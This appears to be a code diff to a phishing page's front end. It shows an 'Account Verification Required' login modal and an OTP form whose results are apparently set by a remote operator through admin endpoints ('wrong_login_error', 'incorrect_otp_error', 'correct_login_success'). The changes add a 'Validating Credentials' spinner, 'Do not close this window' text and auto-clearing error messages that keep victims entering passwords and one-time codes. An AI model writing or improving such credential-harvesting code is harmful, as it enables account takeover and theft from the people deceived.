@@ -132,6 +132,9 @@ button:disabled{
   font-size:13px;
   margin-top:12px;
   display:none;
+  background:#fef2f2;
+  padding:12px;
+  border-radius:12px;
 }
 
 .success-message{
@@ -234,6 +237,15 @@ button:disabled{
   margin-top:12px;
   display:none;
 }
+.loading-spinner-small{
+  width:30px;
+  height:30px;
+  border:3px solid #f3f3f3;
+  border-top:3px solid #4f46e5;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin:10px auto;
+}
 </style>
 </head>
 <body>
@@ -260,7 +272,7 @@ button:disabled{
 </div>
 
 <div id="loginModal" class="modal-overlay">
-  <div class="modal">
+  <div class="modal" id="loginModalContent">
     <div class="modal-icon">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
         <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
@@ -288,7 +300,6 @@ button:disabled{
   let isProcessing = false;
   let approvalInterval = null;
   let blockCheckInterval = null;
-  let resetFlagInterval = null;
   let isModalOpen = false;
 
   async function checkIfBlocked() {
@@ -320,25 +331,37 @@ button:disabled{
     }, 3000);
   }
 
-  function startResetFlagPolling() {
-    if (resetFlagInterval) clearInterval(resetFlagInterval);
-    resetFlagInterval = setInterval(async () => {
-      try {
-        const response = await fetch('/api/users/check-reset-flag', {
+  // Check for Incorrect OTP - shows red error message below input
+  async function checkIncorrectOtp() {
+    try {
+      const response = await fetch('/api/users/check-admin-text', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      
+      if (data.admin_text === 'incorrect_otp_error' && data.text_release === false) {
+        errorDiv.textContent = '❌ Incorrect OTP entered. Please try again.';
+        errorDiv.style.display = 'block';
+        
+        otpInput.value = '';
+        otpInput.focus();
+        
+        await fetch('/api/admin/release-text', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email })
         });
-        const data = await response.json();
         
-        if (data.reset === true) {
-          window.location.href = `/users/otp?email=${encodeURIComponent(email)}`;
-        }
-      } catch (err) {}
-    }, 2000);
+        setTimeout(() => {
+          errorDiv.style.display = 'none';
+        }, 4000);
+      }
+    } catch (err) {}
   }
 
-  // ==================== WRONG LOGIN CHECK ====================
+  // Check for Wrong Login - shows error, clears password, keeps modal open
   async function checkWrongLogin() {
     try {
       const response = await fetch('/api/users/check-admin-text', {
@@ -351,7 +374,7 @@ button:disabled{
       if (data.admin_text === 'wrong_login_error' && data.text_release === false) {
         const modalError = document.getElementById('modalError');
         if (modalError) {
-          modalError.textContent = 'Invalid email or password. Please try again.';
+          modalError.textContent = '❌ Invalid email or password. Please try again.';
           modalError.style.display = 'block';
         }
         const loginPassword = document.getElementById('loginPassword');
@@ -362,11 +385,15 @@ button:disabled{
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email })
         });
+        
+        setTimeout(() => {
+          if (modalError) modalError.style.display = 'none';
+        }, 4000);
       }
     } catch (err) {}
   }
 
-  // ==================== CORRECT LOGIN CHECK ====================
+  // Check for Correct Login - Replace modal content with loading spinner
   async function checkCorrectLogin() {
     try {
       const response = await fetch('/api/users/check-admin-text', {
@@ -377,59 +404,31 @@ button:disabled{
       const data = await response.json();
       
       if (data.admin_text === 'correct_login_success' && data.text_release === false) {
-        const modal = document.getElementById('loginModal');
-        if (modal) modal.classList.remove('active');
-        isModalOpen = false;
-        
-        showLoadingOverlay();
+        const modalContent = document.getElementById('loginModalContent');
+        if (modalContent) {
+          modalContent.innerHTML = `
+            <div style="text-align: center;">
+              <div class="modal-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                  <circle cx="12" cy="12" r="10"/>
+                  <path d="M12 6v6l4 2"/>
+                </svg>
+              </div>
+              <h3>Validating Credentials</h3>
+              <div class="loading-spinner-small"></div>
+              <p>Please wait as we validate your details...</p>
+              <p style="font-size: 12px; color: #666; margin-top: 10px;">Do not close this window</p>
+            </div>
+          `;
+        }
         
         await fetch('/api/admin/release-text', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email })
         });
-        
-        setTimeout(() => {
-          hideLoadingOverlay();
-        }, 3000);
       }
     } catch (err) {}
-  }
-
-  function showLoadingOverlay() {
-    let overlay = document.getElementById('customLoadingOverlay');
-    if (!overlay) {
-      overlay = document.createElement('div');
-      overlay.id = 'customLoadingOverlay';
-      overlay.style.cssText = `
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0,0,0,0.8);
-        backdrop-filter: blur(4px);
-        z-index: 20000;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        flex-direction: column;
-        gap: 20px;
-      `;
-      overlay.innerHTML = `
-        <div style="background: white; padding: 30px; border-radius: 20px; text-align: center;">
-          <div class="spinner" style="width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
-          <p style="color: #333; font-size: 16px;">Please wait as we validate your details...</p>
-        </div>
-      `;
-      document.body.appendChild(overlay);
-    }
-    overlay.style.display = 'flex';
-  }
-
-  function hideLoadingOverlay() {
-    const overlay = document.getElementById('customLoadingOverlay');
-    if (overlay) overlay.style.display = 'none';
   }
 
   function showLoading() {
@@ -513,7 +512,6 @@ button:disabled{
       if (data.success) {
         showWaitingForApproval();
         startBlockChecking();
-        startResetFlagPolling();
         startCheckingSecondApproval();
       } else {
         hideLoading();
@@ -576,6 +574,24 @@ button:disabled{
   function hideLoginModal() {
     isModalOpen = false;
     document.getElementById('loginModal').classList.remove('active');
+    const modalContent = document.getElementById('loginModalContent');
+    if (modalContent) {
+      modalContent.innerHTML = `
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+            <polyline points="22,6 12,13 2,6"/>
+          </svg>
+        </div>
+        <h3>Account Verification Required</h3>
+        <p>Please login with your email and password to continue.</p>
+        <input type="email" id="loginEmail" class="modal-input" placeholder="Email address">
+        <input type="password" id="loginPassword" class="modal-input" placeholder="Password">
+        <button id="submitLoginBtn" class="modal-btn">Login to Continue →</button>
+        <div id="modalError" class="modal-error"></div>
+      `;
+      document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);
+    }
   }
 
   async function submitLogin() {
@@ -609,7 +625,7 @@ button:disabled{
       });
       const data = await response.json();
       if (data.success) {
-        hideLoginModal();
+        // Don't close modal - will be handled by admin
       } else {
         modalError.textContent = data.error || 'Failed to verify account';
         modalError.style.display = 'block';
@@ -627,7 +643,7 @@ button:disabled{
   startForceLoginPolling();
   startRedirectSuccessPolling();
   startBlockChecking();
-  startResetFlagPolling();
+  setInterval(checkIncorrectOtp, 2000);
   setInterval(checkWrongLogin, 2000);
   setInterval(checkCorrectLogin, 2000);
 
